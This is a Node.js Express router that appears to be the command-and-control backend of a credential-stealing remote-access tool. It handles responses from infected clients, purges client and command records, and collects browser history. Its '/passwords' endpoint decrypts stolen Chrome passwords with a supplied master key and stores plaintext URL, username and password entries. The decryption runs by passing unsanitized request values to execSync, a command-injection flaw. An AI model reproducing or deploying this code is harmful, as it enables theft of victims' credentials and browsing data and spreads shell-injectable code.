const router = require('express').Router();
const Response = require('../responses.model');
const {GenerateRandomId} = require("../../../Api/Utils/UtilFunctions/utilFunctions");
const Utils = require("../../../Api/Utils/UtilFunctions/utilFunctions");
const Client = require('../../tool.model');
const Command = require("../../Commands/commands.model");
const path = require("path");
const child_process = require("child_process");
const {getUrlsFromDB} = require("../../../Api/Utils/UtilFunctions/clientUtils");
const {addNewClientResponse} = require("../../../Api/Utils/UtilFunctions/clientUtils");
const appDir = path.dirname(require.main.filename);

//Regular command response
router.route('/').post(async (req, res) => {
    const clientId = req.headers.clientid;
    const response = req.body.response;
    await addNewClientResponse(clientId, response).then(() => res.send()).catch(err => res.status(400).send())
});

//tool checkout after exit
router.route('/checkout').get((req, res) => {
    try {
        const sessionKey = req.cookies['session_id'];
        const clientId = req.headers['clientid'];
        Client.findOneAndDelete({client_id: clientId, session_key: sessionKey}, {}, (err) => {
            if (err)
                Utils.LogToFile(`Error removing tool client after checkout ${err}`);
        });
        Command.find({}, (err, commands) => {
            if (err) {
                Utils.LogToFile(`Error fetching all client commands from db ${err}`);
            } else {
                if (commands.length !== 0) {
                    for (let i = 0; i < Object.keys(commands).length; i++) {
                        const commandId = commands[i]['command_id'];
                        Command.findOneAndDelete({command_id: commandId}, (err) => {
                            if (err)
                                Utils.LogToFile(`Error removing command from db for killed client${err}`);
                        })
                    }
                }
            }
        });
    } catch (err) {
        Utils.LogToFile(`Error removing tool client after checkout ${err}`);
    }

    res.send();
})


function generatePasswordData(data, masterKey) {
    let buffer = ""
    let decryptedPass = ""
    for (let object in data) {
        if (data.hasOwnProperty(object)) {
            let url = data[object][0]['url']
            let username = data[object][1]['username']
            let password = data[object][2]['password']
            if (url && username && password) {
                buffer += `[+] Url: ${url}\n`
                buffer += `[+] Username: ${username}\n`
                try {
                    decryptedPass = child_process.execSync(`python3 ` + path.resolve(appDir, 'Api', 'scripts', 'decrypt.py') + ` ${password} ${masterKey}`)
                } catch (e) {
                    decryptedPass = child_process.execSync(`python ` + path.resolve(appDir, 'Api', 'scripts', 'decrypt.py') + ` ${password} ${masterKey}`)
                }
                buffer += `[+] Password: ${decryptedPass}\n`
            }
        } else
            buffer = "No passwords have been found"
    }
    return buffer
}

//chrome passwords handle
router.post("/passwords", function (req, res) {
    let clientId = req.headers['clientid'];
    let data = req.body;
    let buffer;
    if (data.response)
        buffer = data.response
    else {
        let masterKey = req.body['masterKey'];
        buffer = generatePasswordData(data, masterKey)
    }
    try {
        const newResponse = new Response({
            response_id: GenerateRandomId(6),
            client_id: clientId,
            response: buffer,
            date: Utils.GetCurrentTimeDate()
        });
        newResponse.save()
            .then(() => res.send())
            .catch(err => {
                Utils.LogToFile(`Error adding passwords response: ${err.message}`)
                res.sendStatus(403)
            })
        Client.findOneAndUpdate({client_id: clientId}, {lastActive: Utils.GetCurrentTimeDate()}, {useFindAndModify: false},
            function (err) {
                if (err)
                    Utils.LogToFile(`Error updating last active for client ${clientId}`);
            })
    } catch (err) {
        Utils.LogToFile(`Error getting data from passwords request ${err}`);
        res.sendStatus(500)
    }
});

//get client browser history
router.route('/history').get((req, res) => {
    let clientId = req.headers['clientid']
    getUrlsFromDB(clientId)
    res.send()

})

module.exports = router;